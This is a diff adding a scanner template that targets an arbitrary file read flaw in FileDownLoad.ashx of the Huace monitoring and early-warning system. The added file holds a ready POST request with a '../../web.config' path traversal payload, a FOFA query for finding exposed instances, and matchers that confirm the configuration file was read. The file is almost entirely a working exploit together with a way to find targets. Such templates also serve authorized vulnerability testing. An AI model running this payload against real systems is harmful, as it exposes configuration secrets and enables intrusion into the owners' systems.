@@ -1,0 +1,28 @@
+## id: VEID-2025-0102
+## name: 华测监测预警系统FileDownLoad.ashx存在任意文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2025
+## description:华测监测预警系统FileDownLoad.ashx存在任意文件读取漏洞，通过读取配置文件获取重要数据。
+## fofa-query: app="华测监测预警系统2.2" - icon_hash="-628229493"
+## verification: true
+
+
+POST /Handler/FileDownLoad.ashx HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+filename=veil&filepath=../../web.config
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "download" 
+#@ matcher: body contains "<?xml"
+
+
+
+
+
+# @VEIL-STAMP: 16dd30b4fabe3883b6ce0094ed95b8cacb8b9292e0825e6b14f4e817d0c18bed
